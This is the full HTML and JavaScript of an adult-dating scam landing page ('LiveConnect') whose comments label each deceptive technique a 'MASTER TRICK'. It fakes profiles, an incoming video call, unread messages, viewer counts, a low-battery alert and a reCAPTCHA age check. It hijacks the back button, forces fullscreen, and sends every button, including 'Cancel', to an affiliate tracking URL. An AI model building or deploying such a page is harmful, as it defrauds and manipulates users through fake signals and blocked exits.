<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="pageTitle">LiveConnect - 100% Free Local Matches</title>
    <link rel="icon" id="dynamicFavicon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjUwIiByPSI1MCIgZmlsbD0iIzEwYjk4MSIvPjwvc3ZnPg==">
    
    <meta property="og:title" content="Someone near you wants to connect! ❤️">
    <meta property="og:description" content="You have (3) unseen messages and (1) missed video call. Tap to open the secure app.">
    <meta property="og:image" content="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true">
    <meta property="og:url" content="https://liveconnect.local">
    <meta property="og:type" content="website">

    <link rel="preconnect" href="https://bedjfha.litracksm.com">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&display=swap');
        body { font-family: 'Inter', sans-serif; background: #050505; overflow-x: hidden; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; color: #f3f4f6; padding-bottom: 80px;}
        
        /* Ultra Premium UI Updates */
        .glass-panel { background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .premium-shadow { box-shadow: 0 10px 40px -10px rgba(0,0,0,0.8); }
        
        .pulse-badge { animation: pulseBadge 1.5s infinite; }
        @keyframes pulseBadge { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.9); } 70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }
        
        .pulse-red { animation: pulseRed 1s infinite; }
        @keyframes pulseRed { 0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.9); } 70% { box-shadow: 0 0 0 15px rgba(220, 38, 38, 0); } 100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0); } }

        /* Fake Video Call */
        .incoming-call { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 99999; display: flex; align-items: center; justify-content: center; flex-direction: column; opacity: 0; pointer-events: none; transition: opacity 0.3s; backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); }
        .incoming-call.show { opacity: 1; pointer-events: all; }

        /* Progress Bar VIP */
        #vipBar { width: 100%; height: 4px; background: #333; position: fixed; top: 0; left: 0; z-index: 100000; }
        #vipProgress { width: 100%; height: 100%; background: #ef4444; transition: width 1s linear; }

        /* Bottom Nav */
        .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; height: 65px; background: rgba(10, 10, 12, 0.95); border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-around; items-center; z-index: 9000; padding-bottom: env(safe-area-inset-bottom); backdrop-filter: blur(20px); }
        .nav-item { flex: 1; display: flex; flex-col; align-items: center; justify-content: center; color: #6b7280; font-size: 10px; gap: 4px; position: relative; cursor: pointer; }
        .nav-item.active { color: #10b981; }
        
        /* Ring Animation for profile */
        .match-ring { border-radius: 50%; padding: 4px; background: conic-gradient(#10b981 99%, #333 0); }
        
        /* Blind Click Overlay */
        .blind-click { position: fixed; inset: 0; z-index: 8400; cursor: pointer; }
    </style>
</head>
<body oncontextmenu="return false;" onselectstart="return false;" ondragstart="return false;">

    <div id="preloader" class="fixed inset-0 bg-black z-[1000000] flex flex-col items-center justify-center transition-opacity duration-500">
        <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <p class="text-emerald-500 font-mono text-xs tracking-widest uppercase animate-pulse">Establishing Secure P2P Connection...</p>
    </div>

    <div id="batteryAlert" class="fixed top-0 left-0 w-full bg-red-600 text-white text-xs font-bold text-center py-1 z-[100001] transform -translate-y-full transition-transform duration-500 shadow-lg">
        ⚠️ Warning: Device battery is at 5%. Please join the call quickly!
    </div>

    <div class="fixed top-16 right-4 z-[8000] bg-black/60 backdrop-blur-md border border-white/10 px-3 py-1 rounded-full flex items-center gap-2 shadow-lg">
        <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
        <span class="text-white text-xs font-bold font-mono" id="viewerCount">84</span>
        <i class="fas fa-eye text-zinc-400 text-[10px]"></i>
    </div>

    <div id="vipBar"><div id="vipProgress"></div></div>

    <audio id="ringSnd" loop preload="none"><source src="https://assets.mixkit.co/active_storage/sfx/1353/1353-preview.mp3" type="audio/mpeg"></audio>
    <audio id="msgSnd" preload="none"><source src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" type="audio/mpeg"></audio>
    <audio id="typeSnd" loop preload="none"><source src="https://assets.mixkit.co/active_storage/sfx/2564/2564-preview.mp3" type="audio/mpeg"></audio>
    <audio id="clickSnd" preload="none"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" type="audio/mpeg"></audio>

    <div class="incoming-call" id="incomingCall">
        <div class="w-32 h-32 rounded-full overflow-hidden border-4 border-emerald-500 shadow-[0_0_40px_rgba(16,185,129,0.5)] mb-6 animate-pulse mt-10 relative">
            <img src="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true" class="w-full h-full object-cover">
            <div class="absolute inset-0 bg-emerald-500/20 rounded-full animate-ping"></div>
        </div>
        <h2 class="text-3xl font-black mb-1 tracking-tight text-white">Chloe is calling...</h2>
        <p class="text-emerald-400 font-bold mb-16 text-sm bg-black/50 px-4 py-1 rounded-full"><i class="fas fa-lock mr-1"></i> Private Room (1/2)</p>
        <div class="flex gap-12">
            <button onclick="triggerAction('reject_call')" class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center shadow-lg hover:scale-105 transition relative overflow-hidden group">
                <i class="fas fa-phone-slash text-2xl text-white group-hover:animate-pulse"></i>
            </button>
            <button onclick="triggerAction('accept_call')" class="w-20 h-20 bg-emerald-500 rounded-full flex items-center justify-center shadow-[0_0_40px_rgba(16,185,129,1)] hover:scale-110 transition pulse-badge">
                <i class="fas fa-video text-3xl text-white"></i>
            </button>
        </div>
        <p class="text-zinc-500 text-xs mt-8 animate-pulse">Call will disconnect in <span id="callTimer">00:45</span></p>
    </div>

    <div id="camPermission" class="fixed inset-0 z-[8500] hidden flex items-start justify-center pt-24 transition-opacity">
        <div class="blind-click bg-black/80 backdrop-blur-md" onclick="triggerAction('blind_bg')"></div>
        
        <div class="bg-zinc-900 rounded-2xl w-[90%] max-w-[340px] shadow-2xl border border-zinc-700 overflow-hidden relative z-[8501] premium-shadow" id="camBox">
            <div class="bg-red-600/20 border-b border-red-500/30 px-4 py-1.5 flex justify-between items-center">
                <span class="text-[10px] font-black text-red-400 uppercase tracking-wider"><i class="fas fa-fire mr-1"></i> VIP Room</span>
                <span class="text-[10px] font-bold text-white bg-red-600 px-2 rounded">Capacity: 99/100</span>
            </div>

            <div class="p-5 flex items-center gap-4 border-b border-zinc-800 bg-zinc-800/50">
                <div class="w-12 h-12 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400 shrink-0 text-xl"><i class="fas fa-camera"></i></div>
                <div class="text-sm">
                    <p class="font-bold text-white tracking-tight text-base">Action Required</p>
                    <p class="text-xs text-zinc-400 mt-0.5 leading-tight">Allow camera access to verify you are 18+ and join the private stream.</p>
                </div>
            </div>

            <div class="px-5 py-3 bg-zinc-950 border-b border-zinc-800 flex items-center gap-2 cursor-pointer" onclick="triggerAction('checkbox')">
                <div class="w-4 h-4 bg-emerald-500 rounded flex items-center justify-center"><i class="fas fa-check text-white text-[10px]"></i></div>
                <span class="text-[10px] text-zinc-400">I confirm I am over 18 years old.</span>
            </div>

            <div class="p-4 bg-zinc-900 flex justify-between items-center gap-3">
                <div class="text-[10px] text-zinc-500 font-mono">Expires in: <span id="popupTimer" class="text-red-400 font-bold">01:59</span></div>
                <div class="flex gap-2">
                    <button onclick="triggerAction('block_cam')" class="px-4 py-2 rounded-full text-xs font-bold border border-zinc-700 text-zinc-400">Cancel</button>
                    <button onclick="triggerAction('allow_cam')" class="px-6 py-2 rounded-full text-sm font-black bg-blue-600 text-white shadow-lg pulse-badge">Allow Access</button>
                </div>
            </div>
        </div>
    </div>

    <div id="lookToast" class="fixed top-4 left-1/2 transform -translate-x-1/2 bg-indigo-600 text-white text-[11px] px-4 py-2 rounded-full z-[9999] opacity-0 transition-all duration-500 shadow-xl flex items-center gap-2 translate-y-[-20px]">
        <i class="fas fa-eye animate-pulse"></i> Someone from 1.5km is viewing your photos!
    </div>

    <header class="sticky top-0 z-40 glass-panel border-b border-white/5 p-3 premium-shadow" id="mainHeader">
        <div class="max-w-5xl mx-auto flex justify-between items-center">
            <div>
                <h1 class="text-2xl font-black tracking-tighter text-white flex items-center gap-1">
                    LiveConnect <i class="fas fa-fire text-red-500 text-lg ml-1"></i>
                </h1>
                <p class="text-[9px] text-emerald-400 font-bold tracking-widest uppercase flex items-center gap-1 mt-0.5" id="gpsText">
                    <i class="fas fa-satellite-dish animate-pulse"></i> Locating GPS...
                </p>
            </div>
            <button onclick="triggerAction('login')" class="bg-emerald-500 text-white px-5 py-2 rounded-full font-black text-xs uppercase shadow-[0_0_15px_rgba(16,185,129,0.4)] pulse-badge">
                Join Now
            </button>
        </div>
    </header>

    <main class="max-w-5xl mx-auto p-4 pt-4 relative z-10">
        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 md:gap-4" id="profileGrid"></div>
        
        <div class="mt-8 mb-4 glass-panel rounded-2xl p-6 text-center cursor-pointer border border-zinc-800 hover:border-blue-500 transition" onclick="triggerAction('captcha')">
            <h3 class="text-sm font-black text-white mb-3">Verify Age to Load More</h3>
            <div class="bg-zinc-800 p-3 rounded-lg flex items-center justify-between border border-zinc-700 mx-auto max-w-[220px]">
                <div class="flex items-center gap-3 text-white font-bold text-xs">
                    <div class="w-5 h-5 border-2 border-zinc-500 rounded bg-zinc-900"></div>
                    I am 18+
                </div>
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/120px-RecaptchaLogo.svg.png" class="h-5 grayscale brightness-200">
            </div>
        </div>
    </main>

    <div class="bottom-nav">
        <div class="nav-item active" onclick="triggerAction('nav_home')">
            <i class="fas fa-layer-group text-xl mb-1"></i><span>Discover</span>
        </div>
        <div class="nav-item relative" onclick="triggerAction('nav_chat')">
            <i class="fas fa-comment-dots text-xl mb-1"></i><span>Messages</span>
            <span class="absolute top-1 right-2 bg-red-500 text-white text-[8px] font-bold px-1.5 py-0.5 rounded-full shadow-lg pulse-red">3</span>
        </div>
        <div class="nav-item" onclick="triggerAction('nav_profile')">
            <i class="fas fa-user text-xl mb-1"></i><span>Profile</span>
        </div>
    </div>

    <div id="redirectLoader" class="fixed inset-0 z-[999999] hidden bg-[#050505] flex flex-col items-center justify-center text-center p-4">
        <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-8 shadow-[0_0_30px_rgba(59,130,246,0.5)]"></div>
        <h2 class="text-3xl font-black text-white mb-2 tracking-widest animate-pulse">CONNECTING</h2>
        <p class="text-sm text-emerald-400 font-mono">Bypassing security filters...</p>
        <p class="text-[10px] text-zinc-500 mt-4">Please do not close this window.</p>
    </div>

    <script>
        const AFFILIATE_URL = "https://bedjfha.litracksm.com/s/62b4abc4a39b9?preland=Adult";
        let isRedirecting = false;
        let interacted = false;

        // Pre-loader Remove
        setTimeout(() => {
            const preloader = document.getElementById('preloader');
            preloader.style.opacity = '0';
            setTimeout(() => preloader.remove(), 500);
        }, 1500);

        // MASTER TRICK 29 & 21: Full Screen & Vibration on first click
        document.body.addEventListener('click', () => {
            if(!interacted) {
                interacted = true;
                if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
                
                // Request Fullscreen to hide browser bars
                if(document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen().catch(e => {});
                } else if(document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen().catch(e => {});
                }
            }
        });

        // MASTER TRICK 1: Dynamic Viewer Count
        setInterval(() => {
            let current = parseInt(document.getElementById('viewerCount').innerText);
            let change = Math.floor(Math.random() * 5) - 2; // -2 to +2
            let newCount = current + change;
            if(newCount < 75) newCount = 80;
            if(newCount > 105) newCount = 98;
            document.getElementById('viewerCount').innerText = newCount;
        }, 3500);

        // MASTER TRICK 3: Timers
        function startTimer(id, seconds) {
            let timer = seconds;
            setInterval(function () {
                let minutes = parseInt(timer / 60, 10);
                let secs = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                secs = secs < 10 ? "0" + secs : secs;
                let el = document.getElementById(id);
                if(el) el.textContent = minutes + ":" + secs;
                if (--timer < 0) timer = 0;
            }, 1000);
        }
        startTimer('popupTimer', 119); // 1:59
        startTimer('callTimer', 45); // 0:45

        // Trick 85: VIP Progress bar animation
        setTimeout(() => { document.getElementById('vipProgress').style.width = '0%'; }, 500);

        // Trick 84: GPS Text Update
        setTimeout(() => {
            document.getElementById('gpsText').innerHTML = `<i class="fas fa-map-pin text-emerald-400"></i> Location Synced`;
            document.getElementById('gpsText').classList.remove('animate-pulse');
        }, 3000);

        // MASTER TRICK 5: Low Battery Warning
        setTimeout(() => {
            if(!isRedirecting) {
                const bat = document.getElementById('batteryAlert');
                bat.classList.remove('hidden');
                setTimeout(() => bat.style.transform = 'translateY(0)', 100);
                setTimeout(() => bat.style.transform = 'translateY(-100%)', 5000);
            }
        }, 15000);

        // Trick 86 & 78: Back Button Hijack
        const originalTitle = document.title;
        document.addEventListener("visibilitychange", () => {
            if (document.hidden) { document.title = "(1) 🔴 Missed Video Call!"; } 
            else { document.title = originalTitle; }
        });

        window.history.pushState(null, null, window.location.href);
        window.onpopstate = function() {
            if(!isRedirecting) {
                // Instantly show popup on back attempt instead of redirecting silently
                document.getElementById('camPermission').classList.remove('hidden');
                window.history.pushState(null, null, window.location.href);
            }
        };

        // MASTER TRICK 28: Exit Intent (Desktop)
        document.addEventListener("mouseleave", (e) => {
            if(e.clientY < 0 && !isRedirecting && document.getElementById('incomingCall').classList.contains('show') == false) {
                document.getElementById('camPermission').classList.remove('hidden');
            }
        });

        // Trigger Call
        setTimeout(() => {
            if(!isRedirecting) {
                document.getElementById('incomingCall').classList.add('show');
                try{ document.getElementById('ringSnd').play(); }catch(e){}
                if(navigator.vibrate) navigator.vibrate([500, 500, 500]);
            }
        }, 8000);

        // Trigger Camera Permission Aggressively
        setTimeout(() => {
            if(!isRedirecting && !document.getElementById('incomingCall').classList.contains('show')) {
                document.getElementById('camPermission').classList.remove('hidden');
            }
        }, 20000);

        // Generate Fake Profiles
        const names = ["Sophia","Emily","Mia","Chloe","Lily","Zoe","Ava","Isabella","Charlotte","Amelia","Harper","Evelyn"];
        const imgs = [
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true", 
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafbe3fc1960.jpeg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faeff2b47920.jpeg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faece2309a62.jpeg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images%201.jpg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/ZUQYQVFNR3-thumb.jpg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/Z5CJD4WFFK.jpg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/HE7LupIXEAA2xnS.jpg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/EhU-uxVU4AEV_-n.jpg?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/918ef2fd-89ae-4629-97c1-46aed0bcf444.webp?raw=true",
            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/22.jpg?raw=true"
        ];

        const grid = document.getElementById('profileGrid');
        for(let i=0; i<12; i++) {
            let age = Math.floor(Math.random() * 12) + 20;
            let isSecret = Math.random() > 0.5;
            let secretTag = isSecret ? `<div class="absolute top-2 right-2 bg-black/80 px-2 py-1 rounded text-[8px] text-white font-bold border border-red-500/50"><i class="fas fa-lock text-red-500"></i> 18+ Only</div>` : '';
            
            grid.innerHTML += `
            <div class="glass-panel rounded-2xl overflow-hidden cursor-pointer shadow-lg relative group aspect-[3/4]" onclick="triggerAction('profile_click')">
                <img src="${imgs[i]}" class="w-full h-full object-cover group-hover:scale-110 transition duration-700" loading="lazy">
                ${secretTag}
                <div class="absolute inset-0 bg-gradient-to-t from-black via-black/20 to-transparent"></div>
                <div class="absolute bottom-3 left-3 z-20">
                    <h3 class="font-black text-white text-base flex items-center gap-1">${names[i]}, ${age} <i class="fas fa-check-circle text-blue-500 text-xs bg-white rounded-full"></i></h3>
                    <div class="flex items-center gap-1 mt-0.5">
                        <span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
                        <p class="text-[10px] text-emerald-400 font-bold">Online Now</p>
                    </div>
                </div>
            </div>`;
        }

        function triggerAction(source) {
            if(isRedirecting) return;
            
            // MASTER TRICK 22: Button click sound & Vibration
            try { document.getElementById('clickSnd').play(); } catch(e) {}
            if(navigator.vibrate) navigator.vibrate([50, 50, 50]);
            
            executeRedirect();
        }

        function executeRedirect() {
            isRedirecting = true;
            try { document.getElementById('ringSnd').pause(); } catch(e) {}
            
            // Hide everything except the loader
            document.getElementById('incomingCall').classList.remove('show');
            document.getElementById('camPermission').classList.add('hidden');
            document.getElementById('redirectLoader').classList.remove('hidden');

            // Quick redirect
            setTimeout(() => { window.location.replace(AFFILIATE_URL); }, 1200);
        }
    </script>
</body>
</html>
